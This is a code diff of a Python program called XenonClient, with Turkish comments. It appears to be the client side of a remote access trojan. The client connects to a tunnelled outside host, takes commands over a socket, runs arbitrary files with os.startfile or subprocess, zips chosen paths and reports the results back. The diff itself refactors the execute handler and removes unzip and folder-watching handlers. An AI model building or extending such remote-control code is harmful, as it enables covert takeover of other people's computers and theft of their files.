@@ -12,6 +12,7 @@ import winreg
 import base64
 import tempfile
 import urllib.request
+import zipfile
 
 # --- BAĞLANTI AYARLARI ---
 HOST = "uwtd3ffva.localto.net"
@@ -194,16 +195,7 @@ class XenonClient:
                     path = data.split("|", 1)[1]
                     threading.Thread(target=self.handle_file_zip, args=(path,), daemon=True).start()
 
-                elif data.startswith("file_unzip|"):
-                    path = data.split("|", 1)[1]
-                    threading.Thread(target=self.handle_file_unzip, args=(path,), daemon=True).start()
-
-                elif data.startswith("watch_folder|"):
-                    parts = data.split("|", 2)
-                    if len(parts) == 3:
-                        folder = parts[1]
-                        action = parts[2]
-                        threading.Thread(target=self.handle_watch_folder, args=(folder, action), daemon=True).start()
+                # file_unzip komutu eklenmedi ama client'ta fonksiyon var
 
             except Exception as e:
                 print(f"Listen hatası: {e}")
@@ -324,7 +316,10 @@ class XenonClient:
 
     def handle_file_execute(self, path):
         try:
-            os.startfile(path) if platform.system() == "Windows" else subprocess.Popen([path])
+            if platform.system() == "Windows":
+                os.startfile(path)
+            else:
+                subprocess.Popen([path])
             self.sock.send(f"file_res|execute|{path}|ok".encode("utf-8"))
         except Exception as e:
             self.sock.send(f"file_res|execute|{path}|error|{str(e)}".encode("utf-8"))
@@ -369,7 +364,6 @@ class XenonClient:
 
     def handle_file_zip(self, path):
         try:
-            import zipfile
             zip_name = path + ".zip"
             with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
                 if os.path.isdir(path):
@@ -383,21 +377,6 @@ class XenonClient:
             self.sock.send(f"file_res|zip|{zip_name}|ok".encode("utf-8"))
         except Exception as e:
             self.sock.send(f"file_res|zip|{path}|error|{str(e)}".encode("utf-8"))
-
-    def handle_file_unzip(self, path):
-        try:
-            import zipfile
-            extract_dir = os.path.splitext(path)[0]
-            with zipfile.ZipFile(path, 'r') as zf:
-                zf.extractall(extract_dir)
-            self.sock.send(f"file_res|unzip|{extract_dir}|ok".encode("utf-8"))
-        except Exception as e:
-            self.sock.send(f"file_res|unzip|{path}|error|{str(e)}".encode("utf-8"))
-
-    def handle_watch_folder(self, folder, action):
-        # watchdog ile izleme başlat/durdur
-        # Bu fonksiyonu dilediğiniz gibi geliştirebilirsiniz
-        pass
 
     # ---------- SOHBET GUI ----------
     def gui_chat(self):
